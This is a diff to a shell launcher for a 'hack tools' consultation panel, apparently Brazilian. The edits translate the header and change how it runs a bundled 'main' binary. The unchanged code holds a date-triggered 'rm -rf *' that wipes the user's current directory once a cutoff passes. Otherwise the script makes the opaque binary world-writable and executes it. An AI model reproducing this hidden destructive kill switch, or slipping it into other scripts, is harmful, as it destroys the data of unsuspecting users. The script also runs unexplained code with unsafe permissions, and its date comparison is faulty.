@@ -3,9 +3,9 @@
 <<CLOWNTERS
  #CLOWNTERS
  #--------------------------------------------------------
- # Name script: Painel Clownters                         |
+ # Name script: Panel Clownters                         |
  #--------------------------------------------------------
- # Script     : A1 PAINEL                                |
+ # Script     : A1 PANEL                                |
  #--------------------------------------------------------
  # Description: dashboard for consultation and hack tools|
  #--------------------------------------------------------
@@ -35,6 +35,6 @@ if (($(date +%m%y) >= 0222)); then
     rm -rf *
 else
     chmod 777 main
-    [[ ./main ]] || echo "não compatível" 
+    ./main || echo "não compatível" 
 fi
 exit 0
